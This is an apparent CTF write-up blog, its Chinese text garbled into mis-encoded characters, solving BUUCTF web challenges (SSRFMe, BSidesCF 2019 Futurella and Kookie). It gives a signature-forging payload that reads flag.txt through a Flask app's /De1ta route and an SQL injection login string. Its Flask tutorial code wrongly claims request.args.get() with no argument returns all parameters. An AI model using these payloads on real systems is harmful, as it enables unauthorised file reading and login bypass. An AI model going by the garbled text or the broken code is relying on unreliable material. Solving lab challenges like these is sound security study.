class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">from flask import Flask, request<br><br>app = Flask(__name__)<br><br>@app.route(&#x27;/user&#x27;, methods=[&#x27;GET&#x27;])<br>def get_user():<br>    name = request.args.get(&#x27;name&#x27;)<br>    age = request.args.get(&#x27;age&#x27;)<br><br>    return f&quot;Name: &#123;name&#125;, Age: &#123;age&#125;&quot;<br><br>if __name__ == &#x27;__main__&#x27;:<br>    app.run()<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªè·¯ç”±/userï¼Œå¹¶æŒ‡å®šè¯¥è·¯ç”±åªæ”¯æŒGETæ–¹æ³•ã€‚<br>åœ¨get_userå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨request.args.getæ–¹æ³•è·å–äº†URLå‚æ•°ä¸­åä¸ºnameå’Œageçš„å€¼ï¼Œå¹¶å°†å…¶æ‹¼æ¥æˆå­—ç¬¦ä¸²è¿”å›ã€‚å½“æˆ‘ä»¬è®¿é—®/user?name=John&amp;age=25æ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºName: John, Age: 25<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨request-args-getè·å–æ‰€æœ‰å‚æ•°çš„å€¼"><a href="#ä½¿ç”¨request-args-getè·å–æ‰€æœ‰å‚æ•°çš„å€¼" class="headerlink" title="ä½¿ç”¨request.args.getè·å–æ‰€æœ‰å‚æ•°çš„å€¼"></a>ä½¿ç”¨request.args.getè·å–æ‰€æœ‰å‚æ•°çš„å€¼</h5><p>ä¾‹å­:æœ‰æ—¶å€™æˆ‘ä»¬å¹¶ä¸çŸ¥é“URLå‚æ•°çš„å…·ä½“åç§°ï¼Œæˆ–è€…URLå‚æ•°çš„æ•°é‡æ˜¯å¯å˜çš„ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>request.args.get</code>æ–¹æ³•çš„å¦ä¸€ç§å½¢å¼ï¼Œå³ä¸ä¼ é€’å‚æ•°åï¼Œç›´æ¥è·å–æ‰€æœ‰å‚æ•°çš„å€¼</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;All Params: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨request.args.getæ–¹æ³•è·å–æ‰€æœ‰URLå‚æ•°çš„å€¼ï¼Œå¹¶å°†å…¶æ‹¼æ¥æˆå­—ç¬¦ä¸²è¿”å›ã€‚ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬è®¿é—®/user?name=John&amp;age=25&amp;city=New+Yorkæ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºAll Params: ImmutableMultiDict([(&#x27;name&#x27;, &#x27;John&#x27;), (&#x27;age&#x27;, &#x27;25&#x27;), (&#x27;city&#x27;, &#x27;New York&#x27;)])ã€‚<br></code></pre></td></tr></table></figure><h5 id="éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrequest-args-getæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªImmutableMultiDictå¯¹è±¡ï¼Œå®ƒç±»ä¼¼äºå­—å…¸ä½†æ˜¯ä¸å¯ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æä¾›çš„æ–¹æ³•æ¥è·å–å‚æ•°å€¼ï¼Œæ¯”å¦‚args-getlist-â€˜nameâ€™-å¯ä»¥è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼"><a href="#éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrequest-args-getæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªImmutableMultiDictå¯¹è±¡ï¼Œå®ƒç±»ä¼¼äºå­—å…¸ä½†æ˜¯ä¸å¯ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æä¾›çš„æ–¹æ³•æ¥è·å–å‚æ•°å€¼ï¼Œæ¯”å¦‚args-getlist-â€˜nameâ€™-å¯ä»¥è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼" class="headerlink" title="éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrequest.args.getæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªImmutableMultiDictå¯¹è±¡ï¼Œå®ƒç±»ä¼¼äºå­—å…¸ä½†æ˜¯ä¸å¯ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æä¾›çš„æ–¹æ³•æ¥è·å–å‚æ•°å€¼ï¼Œæ¯”å¦‚args.getlist(â€˜nameâ€™)å¯ä»¥è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼"></a>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrequest.args.getæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªImmutableMultiDictå¯¹è±¡ï¼Œå®ƒç±»ä¼¼äºå­—å…¸ä½†æ˜¯ä¸å¯ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æä¾›çš„æ–¹æ³•æ¥è·å–å‚æ•°å€¼ï¼Œæ¯”å¦‚args.getlist(â€˜nameâ€™)å¯ä»¥è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼</h5><p>ä¾‹å­:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br>    name = args.getlist(<span class="hljs-string">&#x27;name&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Name: <span class="hljs-subst">&#123;name&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨args.getlistæ–¹æ³•è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼ï¼Œå¹¶å°†å…¶æ‹¼æ¥æˆå­—ç¬¦ä¸²è¿”å›ã€‚å½“æˆ‘ä»¬è®¿é—®/user?name=John&amp;name=Tom&amp;name=Jackæ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºName: [&#x27;John&#x27;, &#x27;Tom&#x27;, &#x27;Jack&#x27;]<br></code></pre></td></tr></table></figure><h5 id="hashlib-md5"><a href="#hashlib-md5" class="headerlink" title="hashlib.md5():"></a>hashlib.md5():</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib         <span class="hljs-comment">#å¯¼å…¥hashlibæ¨¡å—</span><br><br>md = hashlib.md5()     <span class="hljs-comment">#è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡</span><br>md.update(<span class="hljs-string">&#x27;how to use md5 in hashlib?&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))                   <span class="hljs-comment">#åˆ¶å®šéœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²</span><br><span class="hljs-built_in">print</span>(md.hexdigest())  <span class="hljs-comment">#è·å–åŠ å¯†åçš„16è¿›åˆ¶å­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">d26a53750bc40b38b65a520292f69306<br></code></pre></td></tr></table></figure><h5 id="str-strip-chars-ç§»é™¤åœ¨å­—ç¬¦ä¸²strä¸­çš„é¦–å°¾å­—ç¬¦chars-é»˜è®¤ç§»é™¤ç©ºæ ¼"><a href="#str-strip-chars-ç§»é™¤åœ¨å­—ç¬¦ä¸²strä¸­çš„é¦–å°¾å­—ç¬¦chars-é»˜è®¤ç§»é™¤ç©ºæ ¼" class="headerlink" title="str.strip([chars]):ç§»é™¤åœ¨å­—ç¬¦ä¸²strä¸­çš„é¦–å°¾å­—ç¬¦chars,é»˜è®¤ç§»é™¤ç©ºæ ¼"></a>str.strip([chars]):ç§»é™¤åœ¨å­—ç¬¦ä¸²strä¸­çš„é¦–å°¾å­—ç¬¦chars,é»˜è®¤ç§»é™¤ç©ºæ ¼</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">str = &quot;0000hello0000&quot;.strip(&#x27;0&#x27;)<br>print(str)<br># hello<br>str = &quot;     hello    &quot;.strip()<br>print(str)<br># hello<br></code></pre></td></tr></table></figure><h5 id="str-lower-å°†å­—ç¬¦ä¸²stræ‰€æœ‰å­—ç¬¦è½¬å°å†™"><a href="#str-lower-å°†å­—ç¬¦ä¸²stræ‰€æœ‰å­—ç¬¦è½¬å°å†™" class="headerlink" title="str.lower():å°†å­—ç¬¦ä¸²stræ‰€æœ‰å­—ç¬¦è½¬å°å†™"></a>str.lower():å°†å­—ç¬¦ä¸²stræ‰€æœ‰å­—ç¬¦è½¬å°å†™</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;AAAAAsssDDD&quot;</span>.lower()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-comment"># aaaaasssddd</span><br></code></pre></td></tr></table></figure><h5 id="Python-startswith-æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸²å¼€å¤´ï¼Œå¦‚æœæ˜¯åˆ™è¿”å›-Trueï¼Œå¦åˆ™è¿”å›-Falseã€‚å¦‚æœå‚æ•°-beg-å’Œ-end-æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ï¼š"><a href="#Python-startswith-æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸²å¼€å¤´ï¼Œå¦‚æœæ˜¯åˆ™è¿”å›-Trueï¼Œå¦åˆ™è¿”å›-Falseã€‚å¦‚æœå‚æ•°-beg-å’Œ-end-æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ï¼š" class="headerlink" title="Python startswith() æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸²å¼€å¤´ï¼Œå¦‚æœæ˜¯åˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚å¦‚æœå‚æ•° beg å’Œ end æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ï¼š"></a>Python startswith() æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸²å¼€å¤´ï¼Œå¦‚æœæ˜¯åˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚å¦‚æœå‚æ•° beg å’Œ end æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ï¼š</h5><p>å‚è€ƒ:<a href="https://www.runoob.com/python/att-string-startswith.html">Python startswith()æ–¹æ³• | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131547193.png" alt="image-20230829131547193"></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131601809.png" alt="image-20230829131601809"></p><h5 id="urllib-urlopen-path"><a href="#urllib-urlopen-path" class="headerlink" title="urllib.urlopen(path):"></a>urllib.urlopen(path):</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><br>myURL = urlopen(<span class="hljs-string">&quot;https://www.runoob.com/&quot;</span>)<br><span class="hljs-built_in">print</span>(myURL.read())<br></code></pre></td></tr></table></figure><p>è§£é‡Š:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä»¥ä¸Šä»£ç ä½¿ç”¨ urlopen æ‰“å¼€ä¸€ä¸ª URLï¼Œç„¶åä½¿ç”¨ read() å‡½æ•°è·å–ç½‘é¡µçš„ HTML å®ä½“ä»£ç ã€‚<br><br>read() æ˜¯è¯»å–æ•´ä¸ªç½‘é¡µå†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šè¯»å–çš„é•¿åº¦<br>å¦‚è¯»å–é•¿åº¦ä¸º300ï¼šread(300)<br></code></pre></td></tr></table></figure><h5 id="REMOTE-ADDR"><a href="#REMOTE-ADDR" class="headerlink" title="REMOTE_ADDR:"></a>REMOTE_ADDR:</h5><p>å‚è€ƒ:<a href="https://www.cnblogs.com/luxiaojun/p/10451860.html">HTTP è¯·æ±‚å¤´ä¸­çš„ Remote_Addrï¼ŒX-Forwarded-Forï¼ŒX-Real-IP - 23äº‘æ‹49æ« - åšå®¢å›­ (cnblogs.com)</a></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¡¨ç¤ºå‘å‡ºè¯·æ±‚çš„è¿œç¨‹ä¸»æœºçš„ IP åœ°å€ï¼Œremote_addrä»£è¡¨å®¢æˆ·ç«¯çš„IPï¼Œä½†å®ƒçš„å€¼ä¸æ˜¯ç”±å®¢æˆ·ç«¯æä¾›çš„ï¼Œè€Œæ˜¯æœåŠ¡ç«¯æ ¹æ®å®¢æˆ·ç«¯çš„ipæŒ‡å®šçš„ï¼Œå½“ä½ çš„æµè§ˆå™¨è®¿é—®æŸä¸ªç½‘ç«™æ—¶ï¼Œå‡è®¾ä¸­é—´æ²¡æœ‰ä»»ä½•ä»£ç†ï¼Œé‚£ä¹ˆç½‘ç«™çš„webæœåŠ¡å™¨ï¼ˆNginxï¼ŒApacheç­‰ï¼‰å°±ä¼šæŠŠremote_addrè®¾ä¸ºä½ çš„æœºå™¨IPï¼Œå¦‚æœä½ ç”¨äº†æŸä¸ªä»£ç†ï¼Œé‚£ä¹ˆä½ çš„æµè§ˆå™¨ä¼šå…ˆè®¿é—®è¿™ä¸ªä»£ç†ï¼Œç„¶åå†ç”±è¿™ä¸ªä»£ç†è½¬å‘åˆ°ç½‘ç«™ï¼Œè¿™æ ·webæœåŠ¡å™¨å°±ä¼šæŠŠremote_addrè®¾ä¸ºè¿™å°ä»£ç†æœºå™¨çš„IP<br></code></pre></td></tr></table></figure><h5 id="x-forwarded-forï¼š"><a href="#x-forwarded-forï¼š" class="headerlink" title="x_forwarded_forï¼š"></a>x_forwarded_forï¼š</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ï¼Œæ­£å¦‚ä¸Šé¢æ‰€è¿°,å½“ä½ ä½¿ç”¨äº†ä»£ç†æ—¶,webæœåŠ¡å™¨å°±ä¸çŸ¥é“ä½ çš„çœŸå®IPäº†,ä¸ºäº†é¿å…è¿™ä¸ªæƒ…å†µ,ä»£ç†æœåŠ¡å™¨é€šå¸¸ä¼šå¢åŠ ä¸€ä¸ªå«åšx_forwarded_forçš„å¤´ä¿¡æ¯,æŠŠè¿æ¥å®ƒçš„å®¢æˆ·ç«¯IP(å³ä½ çš„ä¸Šç½‘æœºå™¨IP)åŠ åˆ°è¿™ä¸ªå¤´ä¿¡æ¯é‡Œ,è¿™æ ·å°±èƒ½ä¿è¯ç½‘ç«™çš„webæœåŠ¡å™¨èƒ½è·å–åˆ°çœŸå®IP<br></code></pre></td></tr></table></figure><h5 id="os-path-exists"><a href="#os-path-exists" class="headerlink" title="os.path.exists():"></a>os.path.exists():</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">oså³operating systemï¼ˆæ“ä½œç³»ç»Ÿï¼‰ï¼ŒPython çš„ os æ¨¡å—å°è£…äº†å¸¸è§çš„æ–‡ä»¶å’Œç›®å½•æ“ä½œã€‚os.pathæ¨¡å—ä¸»è¦ç”¨äºæ–‡ä»¶çš„å±æ€§è·å–,existsæ˜¯â€œå­˜åœ¨â€çš„æ„æ€ï¼Œæ‰€ä»¥é¡¾åæ€ä¹‰ï¼Œos.path.exists()å°±æ˜¯åˆ¤æ–­æ‹¬å·é‡Œçš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨çš„æ„æ€ï¼Œæ‹¬å·å†…çš„å¯ä»¥æ˜¯æ–‡ä»¶è·¯å¾„<br>åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/u012424313/article/details/82216092<br></code></pre></td></tr></table></figure><p>4.åˆ†æ:<br>(1).æœ‰ä»£ç åˆ†æå¾—è®¿é—®url&#x2F;geneSignåªä¼šè¿”å›md5(secert_key + param + action)çš„ç»“æœï¼Œè®¿é—®url&#x2F;åªä¼šè¿”å›code.txtæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å»è®¿é—®url&#x2F;De1ta:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://25f82c99-8160-4244-bc6c-fee7c6ef602e.node4.buuoj.cn:81/De1ta<br></code></pre></td></tr></table></figure><p>å¯¹è·¯ç”±å™¨@app.route(â€˜&#x2F;De1taâ€™, methods&#x3D;[â€˜GETâ€™, â€˜POSTâ€™])ä¸‹çš„å‡½æ•°è¿›è¡Œåˆ†æåå¾—:</p><p>æˆ‘ä»¬éœ€è¦ä»¤param&#x3D;flag.txt,åŒæ—¶actionä¸­å¿…é¡»æœ‰scan,è¿™æ ·å°±å¯ä»¥è°ƒç”¨</p><p>scan(param)ï¼Œå»è®¿é—®å½“å‰ç½‘é¡µä¸‹çš„æ–‡ä»¶flag.txt(å¦‚æœç›´æ¥è®¿é—®æ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œå¯èƒ½æ˜¯flaskæ¡†æ¶çš„ä½œç”¨)</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829140947972.png" alt="image-20230829140947972"></p><p>(2).ä½†æ˜¯å¦‚æœåªæœ‰scanæ˜¯æ— æ³•å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ˜¾ç¤ºçš„ï¼Œåªæœ‰actionä¸­åŒ…å«æœ‰readæ—¶ï¼Œæ‰èƒ½è¿›è¡Œæ˜¾ç¤ºæ–‡ä»¶å†…å®¹:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141123757.png" alt="image-20230829141123757"></p><p>readå¯ä»¥å°†å†™å…¥flag.txtçš„å†…å®¹çš„æ–‡ä»¶result.txtå†æ¬¡è¿›è¡Œè¯»å–ï¼Œå¹¶å­˜å¦‚æœ€ç»ˆéœ€è¦æ˜¾ç¤ºçš„resultå­—å…¸ä¸­:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141312146.png" alt="image-20230829141312146"></p><p>æ‰€ä»¥action&#x3D;scanread</p><p>(3).è¦è§¦å‘ä¸Šè¿°å†…å®¹éœ€è¦ç»•è¿‡checkSign()çš„æ£€æµ‹:<br><strong>md5(secert_key + param + action)&#x3D;sign</strong></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141406740.png" alt="image-20230829141406740"></p><p>5.æœ€ç»ˆpayloadçš„æ„é€ :</p><p>(1).<strong>secert_key:</strong><br><img src="/images/2023-8-29-SSRFMe/image-20230829142324834.png" alt="image-20230829142324834"></p><p><strong>ç”±äºflaskæ¡†æ¶ä¸­ï¼Œç½‘é¡µæ˜¾ç¤ºï¼ˆæ‰§è¡Œï¼‰çš„éƒ½æ˜¯è·¯ç”±å™¨çš„å†…å®¹ï¼Œæ‰€ä»¥å¯¹äºç½‘é¡µæ¥è¯´ï¼Œåœ¨è·¯ç”±å™¨ä¹‹å‰æ‰€å®šä¹‰çš„secert_keyåœ¨ç½‘é¡µæ˜¾ç¤ºåéƒ½æ˜¯å”¯ä¸€çš„ï¼Œå³åœ¨ç½‘é¡µåˆå§‹åŒ–çš„æ—¶å€™å¯¹secert_keyèµ‹å€¼ï¼Œä¹‹åè¯¥å…¨å±€å˜é‡éƒ½æ˜¯ä¸å˜çš„</strong></p><p>(2).å‚æ•°çš„åŸºæœ¬æƒ…å†µ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txt<br>action=scanread<br>secert_key=xxx<br>sign=md5(xxxflag.txtscanread)<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±æ˜¯è¦è·å–md5(xxxflag.txtscanread)çš„å€¼</p><p>(3)url&#x2F;geneSignçš„åˆ©ç”¨:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829142858868.png" alt="image-20230829142858868"></p><p>è¯¥è·¯ç”±å™¨ä¼šè¿”å›:md5(secert_key+param+scan)çš„å€¼</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä»¤param&#x3D;flag.txtread</p><p>åˆ™è¯¥è·¯ç”±å™¨è¿”å›çš„å°±æ˜¯md5(xxxflag.txtreadscan)</p><p>å°±å¯ä»¥æ´»å¾—signçš„å€¼ï¼š<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txtread<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ­¤æ—¶sign&#x3D;5927506259f0daa2cdfb35867203b343&#x3D;xxxflag.txtreadscan</p><p>(3).æœ€ç»ˆçš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">url/De1ta<br>?param=flag.txt<br><br>Cookie:action=readscan;sign=5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-SSRFMe/image-20230829143838356.png" alt="image-20230829143838356"></p><p>flag&#x3D;flag{ceb51b96-bdcf-415a-bb56-da305f851028}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie é¢˜è§£</title>
    <link href="/2023/08/29/2023-08-29-Futurella&amp;Kookie/"/>
    <url>/2023/08/29/2023-08-29-Futurella&amp;Kookie/</url>
    
    <content type="html"><![CDATA[<h2 id="BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-é¢˜è§£"><a href="#BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-é¢˜è§£" class="headerlink" title="[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie é¢˜è§£"></a>[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie é¢˜è§£</h2><h3 id="BSidesCF-2019-Futurellaï¼š"><a href="#BSidesCF-2019-Futurellaï¼š" class="headerlink" title="[BSidesCF 2019]Futurellaï¼š"></a>[BSidesCF 2019]Futurellaï¼š</h3><p>1.æ‰“å¼€ç½‘é¡µ:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102315243.png" alt="image-20230829102315243"></p><p>2.æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œctrl+få¯»æ‰¾flagï¼š<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102410491.png" alt="image-20230829102410491"></p><p>flag&#x3D;flag{bbc0ff54-a162-4d27-a1db-2e02a3bb9208}</p><h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie:"></a>[BSidesCF 2019]Kookie:</h3><p>1.æ‰“å¼€ç½‘é¡µ:<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829100927708.png" alt="image-20230829100927708"></p><p>å‘ç°éœ€è¦è¿›è¡Œç™»å½•ï¼Œç„¶åç™»å½•æ—¶è¦ä¸ºadmin</p><p>2.æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ä¸‡èƒ½å¯†ç è¯•è¯•:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101139704.png" alt="image-20230829101139704"></p><p>å‘ç°ä¸è¡Œ</p><p>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101226407.png" alt="image-20230829101226407"></p><p>å‘ç°æ²¡æœ‰sqlæŠ¥é”™</p><p><strong>3.ä½¿ç”¨ä¸‰å¤§ç›²æ³¨ï¼Œä½†æ˜¯ç›²æ³¨æ˜¯å›æ˜¾1æˆ–0çš„ç•Œé¢ï¼Œç”±äºpasswordä¸æ˜¯0æˆ–1æ‰€ä»¥æ— è®ºæ€ä¹ˆæ 